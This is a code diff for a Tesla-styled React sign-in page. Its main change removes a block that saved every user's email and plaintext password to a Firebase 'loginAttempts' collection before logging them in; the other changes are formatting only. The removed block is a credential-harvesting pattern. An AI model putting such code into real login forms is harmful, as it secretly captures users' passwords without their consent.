@@ -17,25 +17,15 @@ export default function SignIn() {
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
-
+    
     try {
-      // Save raw login details to Firebase Realtime Database
-      const db = getDatabase(app);
-      const loginRef = ref(db, "loginAttempts"); // collection path
-      await push(loginRef, {
-        email: loginForm.email,
-        password: loginForm.password, // ⚠️ raw password storage (not secure)
-        timestamp: new Date().toISOString()
-      });
-
-      // Continue with normal login
       await login(loginForm.email, loginForm.password);
       toast({ title: 'Success', description: 'Logged in successfully' });
     } catch (error) {
-      toast({
-        title: 'Error',
-        description: error instanceof Error ? error.message : 'Invalid email or password',
-        variant: 'destructive'
+      toast({ 
+        title: 'Error', 
+        description: error instanceof Error ? error.message : 'Invalid email or password', 
+        variant: 'destructive' 
       });
     } finally {
       setIsLoading(false);
@@ -70,13 +60,13 @@ export default function SignIn() {
                 id="email"
                 type="email"
                 value={loginForm.email}
-                onChange={(e) => setLoginForm({ ...loginForm, email: e.target.value })}
+                onChange={(e) => setLoginForm({...loginForm, email: e.target.value})}
                 className="bg-tesla-grey border-tesla-border text-white placeholder-gray-400 mt-2"
                 placeholder="Enter your email"
                 required
               />
             </div>
-
+            
             <div>
               <Label htmlFor="password" className="text-white">Password</Label>
               <div className="relative mt-2">
@@ -84,7 +74,7 @@ export default function SignIn() {
                   id="password"
                   type={showPassword ? "text" : "password"}
                   value={loginForm.password}
-                  onChange={(e) => setLoginForm({ ...loginForm, password: e.target.value })}
+                  onChange={(e) => setLoginForm({...loginForm, password: e.target.value})}
                   className="bg-tesla-grey border-tesla-border text-white placeholder-gray-400 pr-10"
                   placeholder="Enter your password"
                   required
@@ -98,7 +88,7 @@ export default function SignIn() {
                 </button>
               </div>
             </div>
-
+            
             <div className="flex items-center justify-between">
               <div className="flex items-center">
                 <input
@@ -117,9 +107,9 @@ export default function SignIn() {
                 </a>
               </div>
             </div>
-
-            <Button
-              type="submit"
+            
+            <Button 
+              type="submit" 
               disabled={isLoading}
               className="w-full bg-tesla-red hover:bg-tesla-red/80 text-white py-3"
             >
